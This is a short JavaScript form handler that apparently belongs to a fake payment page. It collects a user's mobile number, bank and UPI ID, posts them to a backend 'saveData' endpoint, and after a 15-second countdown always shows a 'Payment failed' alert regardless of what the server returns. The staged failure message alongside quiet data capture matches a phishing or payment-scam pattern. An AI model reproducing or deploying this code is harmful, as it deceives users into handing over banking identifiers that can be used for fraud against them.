document.getElementById('userForm').addEventListener('submit', async function (event) {
  event.preventDefault();

  // Show the timer message
  document.getElementById('timerMessage').style.display = 'block';
  let countdown = 15;
  const timerElement = document.getElementById('timer');
  
  // Countdown function
  const countdownInterval = setInterval(function () {
    countdown--;
    timerElement.textContent = countdown;

    if (countdown <= 0) {
      clearInterval(countdownInterval);
      // Show Payment Failed message
      alert("Payment failed. Please try again.");
      document.getElementById('timerMessage').style.display = 'none';
    }
  }, 1000);

  // Get form data
  const mobile = document.getElementById('mobile').value;
  const bank = document.getElementById('bank').value;
  const upi = document.getElementById('upi').value;

  const data = {
    mobile,
    bank,
    upi,
  };

  // Send data to backend API
  try {
    const response = await fetch('http://localhost:5000/saveData', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      alert('Data submitted successfully!');
    } else {
      const errorText = await response.text();
      alert('Error submitting data.');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('Failed to submit data.');
  }
});

